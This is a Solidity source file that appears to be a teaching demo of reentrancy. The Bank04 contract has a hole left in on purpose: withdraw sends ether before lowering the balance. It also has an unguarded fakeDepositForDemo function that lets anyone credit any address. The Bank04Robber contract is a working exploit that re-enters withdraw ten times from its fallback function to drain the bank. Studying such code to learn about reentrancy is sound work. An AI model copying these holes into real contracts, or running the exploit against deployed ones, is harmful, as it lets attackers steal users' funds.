pragma solidity ^0.5.0;

contract Bank04 {
    // state
    mapping(address => uint256) public balances;

    // events
    event Withdrawal(address indexed sender, uint256 amount);
    event Deposit(address indexed sender, uint256 amount);

    // methods
    constructor () public payable {
        // we do not have any non-default initial state
    }

    function deposit()
        public
        payable
        returns (bool success)
    {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
        success = true;
    }

    function fakeDepositForDemo(address sender, uint256 amount) public {
        balances[sender] += amount;
        emit Deposit(sender, amount);
    }

    function withdraw(uint256 amount)
        public
        returns (bool success)
    {
        require(balances[msg.sender] >= amount);

        // solidity compiler tries its best to prevent smart contract developers
        // from doing a foot-gun, by setting a "gas stipend", which effectively
        // prevents `.transfer()` or `.send()`, but does not prevent an equivalent
        // via `.call.value()`. Otherwise the gas is hardcoded to 2300, which
        // prevents most reentrance
        (bool transferSuccess,) = msg.sender.call.value(amount)("");
        if (!transferSuccess) {
            revert();
        }

        // the above line loses flow control, whenever msg.sender is a contract,
        // so we may never reach the next lines
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
        success = true;
    }
}

contract Bank04Robber {
    Bank04 public target;
    uint public count;

    event Robbed(uint256 balance);

    constructor (address newTarget)
        public
        payable
    {
        target = Bank04(newTarget);

        // call deposit, which is payable, with `msg.value=100`,
        // in order ot allow attack
        target.deposit.value(100)();
    }

    function steal() public {
        // attack
        target.withdraw(100);
    }

    function balance()
        public
        view
        returns (uint)
    {
        return address(this).balance;
    }

    function ()
        external
        payable
    {
        if (count < 10) {
            // reenter ten times with maliciours intent
            count++;
            target.withdraw(100);
            emit Robbed(address(this).balance);
        }
    }
}
